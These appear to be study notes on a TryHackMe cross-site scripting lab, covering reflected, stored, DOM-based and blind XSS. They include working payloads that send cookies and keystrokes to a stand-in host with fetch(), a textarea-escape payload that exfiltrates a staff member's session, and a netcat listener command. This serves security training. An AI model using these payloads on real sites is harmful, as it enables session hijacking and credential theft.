---
source: https://tryhackme.com/room/xssgi
---
**Proof of Concept**

* just demonstrate you can do XSS on a website; could simply be an alert box popping up
* <script>alert('XSS');</script>
		

**Session stealing**

* cookies contain details of a user's session
* you can base64 encode a cookie (to ensure successful transmission) and then post it to a website under an attacker's control
* if the attacker has all the necessary cookies they can log in as a particular user and take over that user's session
* <script>fetch('<https://hacker.thm/steal?cookie=>' + btoa(document.cookie));</script>
		

**Key logger**

*  you can create scripts that act as key loggers and collect user credentials or other data
* <script>document.onkeypress = function(e) { fetch('<https://hacker.thm/log?key=>' + btoa(e.key) );}</script>
		

**Business logic**

* this calls upon particular network resources or JS functions
* suppose there is a JS function for changing a user's email called **user.changeEmail()**
* <script>user.changeEmail('[attacker@hacker.thm](mailto:attacker@hacker.thm)');</script>
		

**Reflected XSS**

user-supplied data in an HTTP request is included in a webpage source without any validation

* **Example**

				suppose a website is made where an error message is displayed when incorrect input is entered; the contents of the error message gets taken from the  **error parameter** in the query string and is built in to the page source
				

				if an application does not check the contents of the error parameter, an attacker could insert their own code into the parameter

![[./_resources/Cross-Site_Scripting.resources/image.png]]

**How to test for reflected XSS**

* parameters in the URL Query String
* URL file path
* potentially the HTTP Header 

**Stored XSS**

the payload is stored on the website itself, such as a database, then gets run when other users  visit the site

* **Example**
	* suppose you have a blog website allowing commenting by users, but these comments aren't checked as to whether they contain any malicious code; this means that posts containing malicious code will be stored in a database and can be run for every other user who visits the website
	* ![[./_resources/Cross-Site_Scripting.resources/image.1.png]]
	* the malicious JS could redirect users to another site, steal a session cookie, or perform other actions while acting as an authorized user
* **Testing for stored XSS**
	* test all points of entry regarding when data is stored and then shown back to users

**DOM-based XSS**

* **DOM is the Document Object Model** and is a programming interface for HTML and XML documents

* diagram of an HTML DOM:
	* ![[./_resources/Cross-Site_Scripting.resources/image.2.png]]
* DOM-based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to the backend; execution happens when JS code acts in user interaction
* **Example**
	* some site's JS gets its contents from the **window.location.hash** parameter and then writes that to the page in what is currently being viewed; the contents of the hash are not checked, thus allowing malicious code to be introduced
* **potential impact**
	* victims could be sent crafted links, redirecting them  to another website  or steal content from a user's session
* **how to test against DOM-based XSS**
	* look for parts of the JS code that accesses certain variables an attacker could gain control over
	* then, see if those variables are written to the page's DOM or passed to unsafe JS methods such as **eval()**

**Blind XSS**

* below is an example of blind XSS via a web form
	

Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.
![[./_resources/Cross-Site_Scripting.resources/bd30b2541fb8186755110f5ec3e84330.png]]![[./_resources/Cross-Site_Scripting.resources/34e69ee3fce3021fee02a13a680d5d47.png]]

Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

**</textarea>test**

Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.
![e247f6dd0b2ebe0e4e512b16b41cec05.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e247f6dd0b2ebe0e4e512b16b41cec05.png)

![[./_resources/Cross-Site_Scripting.resources/0ad04cf010b889a8adfdba9d24bcb826.png]]

Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

 **</textarea><script>alert('THM');</script>**

Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 
Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly you'll need to set up a listening server to receive the information; we'll discuss two methods of doing this:

**One:**

If you're connected to the TryHackMe VPN or using the TryHackMe AttackBox, you could set up a listening server using **Netcat**:

```
user@machine$ nc -nlvp 9001
```

**Two:**
You can use the TryHackMe request catcher at [http://10.10.10.100](http://10.10.10.100/)(you must be connected to the TryHackMe VPN network or using the browser in an AttackBox for this to work). This service provides a unique URL that receives and displays HTTPand DNS requests made to it.
Now that you've decided on the method of receiving the exfiltrated information, let's build the payload.

**</textarea><script>fetch('<http://{URL_OR_IP}?cookie>\=' + btoa(document.cookie) );</script>**

Let's breakdown the payload:

* **The </textarea>tag closes the textarea field.** 
* **The<script>tag opens open an area for us to write JavaScript.**
* **The fetch() command makes an HTTPrequest.**
* **{URL\_OR\_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.**
* **?cookie= is the query string that will contain the victim's cookies.**
* **btoa() command base64 encodes the victim's cookies.**
* **document.cookie accesses the victim's cookies for the Acme IT Support Website.**
* **</script>closes the JavaScript code block.**

Now create another ticket using the above payload, making sure to swap out the {URL\_OR\_IP} variable to your settings (make sure to specify the port number as well, in case you are using Method One).

Now, wait up to a minute, and you'll see the request come through containing the victim's cookies. 

You can now base64 decode this information using a site like <https://www.base64decode.org/>, giving you the necessary information to answer the below question.
